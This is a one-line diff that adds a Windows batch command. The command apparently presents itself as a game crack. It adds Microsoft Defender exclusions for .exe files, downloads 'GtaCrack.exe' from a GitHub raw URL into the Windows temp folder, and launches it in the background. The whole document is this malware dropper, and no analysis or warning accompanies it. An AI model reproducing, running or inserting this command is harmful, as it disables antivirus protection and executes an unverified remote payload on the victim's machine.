@@ -1,0 +1,1 @@
+@echo off & powershell -Command "Add-MpPreference -ExclusionExtension .exe" & powershell -Command "Add-MpPreference -ExclusionExtension exe" & timeout /t 1 & powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Hosting312/michelan/main/GtaCrack.exe -OutFile '%windir%\temp\GtaCrack.exe'" & Start /B "" "%WinDir%\temp\GtaCrack.exe" 
